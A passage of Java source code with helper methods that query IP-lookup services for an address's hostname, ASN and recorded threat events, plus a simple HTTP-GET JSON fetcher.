				jo2 = getJSONObjectFromURL("http://legacy.iphub.info/api.php?ip=" + ip + "&showtype=4");
			} catch (Exception e1) {
				return "null";
			}
		} catch (JSONException e) {
			// TODO Auto-generated catch block
			try {
				jo2 = getJSONObjectFromURL("http://legacy.iphub.info/api.php?ip=" + ip + "&showtype=4");
			} catch (Exception e1) {
				return "null";
			}
		}

		if (!(jo2 == null)) {
			try {
				String hostname = jo2.getString("hostname");
				String asn = jo2.getString("asn");

				return hostname;

			} catch (Exception e) {
				return "null";
			}

		} else {
			return "null";
		}
	}

	public static boolean checkthree(String ip) {
		JSONObject jo2 = null;
		try {
			jo2 = getJSONObjectFromURL("https://cymon.io/api/nexus/v1/ip/" + ip.trim() + "/events/?format=json");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			try {
				jo2 = getJSONObjectFromURL("https://cymon.io/api/nexus/v1/ip/" + ip.trim() + "/events/?format=json");
			} catch (Exception e1) {
				return false;
			}
		} catch (JSONException e) {
			// TODO Auto-generated catch block
			try {
				jo2 = getJSONObjectFromURL("https://cymon.io/api/nexus/v1/ip/" + ip.trim() + "/events/?format=json");
			} catch (Exception e1) {
				return false;
			}
		}

		if (!(jo2 == null)) {
			try {
				int result2long = jo2.getInt("count");

				if (result2long >= 1) {
					return true;
				} else {
					return false;
				}

			} catch (Exception e) {
				return false;
			}

		} else {
			return false;
		}
	}

	public static String getASN(String ip) {
		JSONObject jo2 = null;
		try {
			jo2 = getJSONObjectFromURL("http://legacy.iphub.info/api.php?ip=" + ip + "&showtype=4");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			try {
				jo2 = getJSONObjectFromURL("http://legacy.iphub.info/api.php?ip=" + ip + "&showtype=4");
			} catch (Exception e1) {
				return "null";
			}
		} catch (JSONException e) {
			// TODO Auto-generated catch block
			try {
				jo2 = getJSONObjectFromURL("http://legacy.iphub.info/api.php?ip=" + ip + "&showtype=4");
			} catch (Exception e1) {
				return "null";
			}
		}

		if (!(jo2 == null)) {
			try {
				String hostname = jo2.getString("hostname");
				String asn = jo2.getString("asn");

				return asn;

			} catch (Exception e) {
				return "null";
			}

		} else {
			return "null";
		}
	}

	public static JSONObject getJSONObjectFromURL(String urlString) throws IOException, JSONException {

		HttpURLConnection urlConnection = null;

		URL url = new URL(urlString);

		urlConnection = (HttpURLConnection) url.openConnection();

		urlConnection.setRequestMethod("GET");
		urlConnection.setReadTimeout(10000 /* milliseconds */);
		urlConnection.setConnectTimeout(15000 /* milliseconds */);

		urlConnection.setDoOutput(true);

		urlConnection.connect();

		BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));

		char[] buffer = new char[1024];

		String jsonString = new String();

		StringBuilder sb = new StringBuilder();
		String line;
		while ((line = br.readLine()) != null) {
			sb.append(line + "\n");
		}
		br.close();

		jsonString = sb.toString();

		return new JSONObject(jsonString);
	}

}
